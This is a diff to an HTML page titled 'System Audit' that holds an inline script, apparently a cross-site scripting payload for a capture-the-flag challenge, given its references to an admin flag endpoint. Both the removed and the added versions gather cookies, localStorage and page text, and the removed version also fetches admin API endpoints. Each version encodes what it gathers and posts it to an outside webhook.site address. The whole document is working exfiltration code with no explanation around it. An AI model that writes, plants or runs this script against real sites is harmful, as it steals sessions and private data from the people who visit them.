@@ -3,36 +3,21 @@
 <head><title>System Audit</title></head>
 <body>
     <script>
-       (async function() {
+      (function() {
     const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
-    const endpoints = [
-        '/api/admin/messages',
-        '/api/admin/flag',
-        '/api/auth/me'
-    ];
-
-    let exfilData = {
+    
+    // Grab the entire page content and cookies
+    const secrets = {
+        url: window.location.href,
         cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        responses: {}
+        body: document.body.innerText, // This extracts text only, looking for the flag
+        localStorage: JSON.stringify(localStorage)
     };
 
-    // Attempt to fetch known sensitive internal endpoints
-    for (const url of endpoints) {
-        try {
-            const res = await fetch(url);
-            const text = await res.text();
-            exfilData.responses[url] = text;
-        } catch (e) {
-            exfilData.responses[url] = "Error: " + e.message;
-        }
-    }
-
-    // Send everything back to you
     fetch(webhook, {
         method: 'POST',
         mode: 'no-cors',
-        body: btoa(JSON.stringify(exfilData))
+        body: btoa(JSON.stringify(secrets))
     });
 })();
     </script>
